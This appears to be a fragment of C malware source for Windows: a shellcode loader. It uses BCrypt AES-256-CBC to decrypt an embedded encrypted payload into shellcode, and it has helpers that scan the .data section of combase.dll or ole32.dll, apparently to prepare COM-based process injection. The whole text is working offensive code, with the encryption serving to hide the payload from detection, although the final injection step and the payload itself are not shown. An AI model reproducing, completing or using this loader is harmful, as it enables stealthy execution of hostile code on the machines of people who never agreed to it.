// ============================================================
// BCrypt AES-256-CBC: encrypt or decrypt one buffer
// ============================================================
static int aes_crypt(
    int encrypt,
    const unsigned char* input,
    int input_len,
    const unsigned char* key,
    const unsigned char* iv,
    unsigned char** output,
    int* output_len
) {
    BCRYPT_ALG_HANDLE  hAlg = NULL;
    BCRYPT_KEY_HANDLE  hKey = NULL;
    unsigned char*     key_object = NULL;
    unsigned char*     iv_work = NULL;
    unsigned char*     result = NULL;
    DWORD              key_object_len = 0;
    DWORD              block_len = 0;
    DWORD              data_len = 0;
    DWORD              result_len = 0;
    NTSTATUS           status;
    int                ok = 0;

    *output = NULL;
    *output_len = 0;

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(status)) goto cleanup;

    status = BCryptSetProperty(
        hAlg,
        BCRYPT_CHAINING_MODE,
        (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
        (ULONG)sizeof(BCRYPT_CHAIN_MODE_CBC),
        0
    );
    if (!NT_SUCCESS(status)) goto cleanup;

    status = BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&key_object_len, sizeof(DWORD), &data_len, 0);
    if (!NT_SUCCESS(status)) goto cleanup;

    status = BCryptGetProperty(hAlg, BCRYPT_BLOCK_LENGTH, (PUCHAR)&block_len, sizeof(DWORD), &data_len, 0);
    if (!NT_SUCCESS(status)) goto cleanup;

    if (block_len != AES_IV_LEN) goto cleanup;

    key_object = (unsigned char*)malloc(key_object_len);
    iv_work    = (unsigned char*)malloc(AES_IV_LEN);
    if (!key_object || !iv_work) goto cleanup;

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, key_object, key_object_len, (PUCHAR)key, AES_KEY_LEN, 0);
    if (!NT_SUCCESS(status)) goto cleanup;

    memcpy(iv_work, iv, AES_IV_LEN);

    if (encrypt) {
        status = BCryptEncrypt(hKey, (PUCHAR)input, input_len, NULL, iv_work, AES_IV_LEN, NULL, 0, &result_len, BCRYPT_BLOCK_PADDING);
    } else {
        status = BCryptDecrypt(hKey, (PUCHAR)input, input_len, NULL, iv_work, AES_IV_LEN, NULL, 0, &result_len, BCRYPT_BLOCK_PADDING);
    }
    if (!NT_SUCCESS(status)) goto cleanup;

    if (result_len == 0 || result_len > INT_MAX) goto cleanup;

    result = (unsigned char*)malloc(result_len);
    if (!result) goto cleanup;

    memcpy(iv_work, iv, AES_IV_LEN);

    if (encrypt) {
        status = BCryptEncrypt(hKey, (PUCHAR)input, input_len, NULL, iv_work, AES_IV_LEN, result, result_len, &data_len, BCRYPT_BLOCK_PADDING);
    } else {
        status = BCryptDecrypt(hKey, (PUCHAR)input, input_len, NULL, iv_work, AES_IV_LEN, result, result_len, &data_len, BCRYPT_BLOCK_PADDING);
    }
    if (!NT_SUCCESS(status)) goto cleanup;

    *output     = result;
    *output_len = (int)data_len;
    result      = NULL;
    ok          = 1;

cleanup:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    free(key_object);
    free(iv_work);
    free(result);
    return ok;
}

// ============================================================
// Decrypt the combined IV+ciphertext payload.
// Returns malloc'd shellcode in *out_shellcode (caller frees).
// ============================================================
bool aes_decrypt_payload(
    const unsigned char* payload,
    int                  payload_len,
    unsigned char**      out_shellcode,
    int*                 out_len
) {
    *out_shellcode = NULL;
    *out_len       = 0;

    if (payload_len <= AES_IV_LEN) {
        printf("[!] Encrypted payload too short (%d bytes, need >%d)\n", payload_len, AES_IV_LEN);
        return false;
    }

    const unsigned char* iv        = payload;
    const unsigned char* ciphertext = payload + AES_IV_LEN;
    int                  ct_len    = payload_len - AES_IV_LEN;

    unsigned char* decrypted = NULL;
    int            decrypted_len = 0;

    if (!aes_crypt(0, ciphertext, ct_len, AES_KEY, iv, &decrypted, &decrypted_len)) {
        printf("[!] AES-256-CBC decryption failed.\n");
        return false;
    }

    printf("[+] AES-256-CBC decrypted %d bytes of shellcode\n", decrypted_len);

    *out_shellcode = decrypted;
    *out_len       = decrypted_len;
    return true;
}

//
// Read the address and size of the .data segment for combase.dll or ole32.dll
//
bool
get_com_data(COM_CONTEXT* c) {
    auto m = (PBYTE)GetModuleHandleW(L"combase");

    if (!m) {
        // old systems use ole32
        m = (PBYTE)GetModuleHandleW(L"ole32");
        if (!m) return false;
    }

    auto nt = (PIMAGE_NT_HEADERS)(m + ((PIMAGE_DOS_HEADER)m)->e_lfanew);
    auto sh = IMAGE_FIRST_SECTION(nt);

    for (DWORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (*(PDWORD)sh[i].Name == *(PDWORD)".data") {
            c->base = m;
            c->data = sh[i].VirtualAddress;
            c->size = sh[i].Misc.VirtualSize;
            return true;
        }
    }
    return false;
}

//
// Search for arbitrary data within the .data segment of combase.dll or ole32.dll and return the RVA.
//
bool
find_com_data(COM_CONTEXT* c, PBYTE inbuf, DWORD inlen, PDWORD rva) {
    if (c->size < inlen) return false;
    PBYTE addr = (c->base + c->data);

    for (DWORD i = 0; i < (c->size - inlen); i++) {
        if (!memcmp(&addr[i], inbuf, inlen)) {
            *rva = (DWORD)(&addr[i] - c->base);
            return true;
        }
    }
    return false;
}

